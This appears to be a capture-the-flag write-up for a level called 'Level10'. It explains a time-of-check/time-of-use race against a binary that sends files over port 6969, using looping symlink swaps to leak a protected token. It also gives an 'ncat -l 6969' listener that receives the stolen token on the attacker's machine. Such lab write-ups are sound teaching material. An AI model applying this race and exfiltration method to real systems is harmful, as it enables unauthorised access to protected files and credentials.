# Level10

We have a binary and a token file.
The binary allows us to send the content of a file over the network. Over the port 6969 that it is attached to.
Dissasembling the binary, we find the `access` syscall which does not let us simply bypass it with a simple symlink. BUT it is vulnerable to a `TOCTOU attack (Time of check/Time of use attack)`.

To exploit this, we wrote a script to create a symlink to a file that we have access to, and then overwrite the symlink to the token file, and all this in an endless loop.

We launch `ncat -l 6969` on our machine to receive the sent token.
We then launch our script in `/tmp/level10/script.sh` (don't forget to `chmod +x`).
And finally we need to get the good timing when executing `./level10/tmp/level10/link <our-machine-ip>`.
We will eventually receive the password for the flag10 user.
